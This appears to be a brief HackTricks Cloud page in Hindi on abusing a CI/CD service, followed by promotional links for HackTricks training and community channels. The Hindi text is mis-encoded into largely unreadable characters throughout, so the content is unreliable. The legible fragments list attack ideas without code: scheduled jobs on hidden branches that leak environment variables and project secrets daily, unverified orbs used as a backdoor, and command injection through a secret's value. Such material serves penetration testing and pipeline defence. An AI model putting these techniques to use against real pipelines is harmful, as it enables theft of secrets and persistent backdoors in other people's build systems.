* **рдПрдХ рдХреНрд░реЙрди рдЬреЙрдм рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ** рдПрдХ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рд╢рд╛рдЦрд╛ рдореЗрдВ рдЬреЛ **рдкреНрд░рддрд┐рджрд┐рди рд╕рднреА рд╕рдВрджрд░реНрдн рдПрдирд╡реА рд╡рд╛рд░реНрд╕ рд▓реАрдХ рдХрд░ рд░рд╣реА рд╣реИ**ред
* рдпрд╛ рдлрд┐рд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ рдмрдирд╛рдирд╛ / рдПрдХ рдЬреНрдЮрд╛рдд рдЬреЙрдм рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдЬреЛ **рдкреНрд░рддрд┐рджрд┐рди рд╕рднреА рд╕рдВрджрд░реНрдн рдФрд░ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд▓реАрдХ рдХрд░реЗрдЧрд╛**ред
* рдЕрдЧрд░ рдЖрдк рдПрдХ рдЧрд┐рдЯрд╣рдм рдорд╛рд▓рд┐рдХ рд╣реИрдВ рддреЛ рдЖрдк **рдЕрдирд╕рддреНрдпрд╛рдкрд┐рдд рдСрд░реНрдмреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдПрдХ рдЬреЙрдм рдореЗрдВ рдПрдХ **рдмреИрдХрдбреЛрд░** рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* рдЖрдк рдХрд┐рд╕реА рдХрд╛рд░реНрдп рдореЗрдВ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА** рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рдорд╛рди рдореЗрдВ **рдХрдорд╛рдВрдб рдЗрдВрдЬреЗрдХреНрд╢рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ **рд░рд╣рд╕реНрдп** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрд╕рдХреЗ рдорд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}
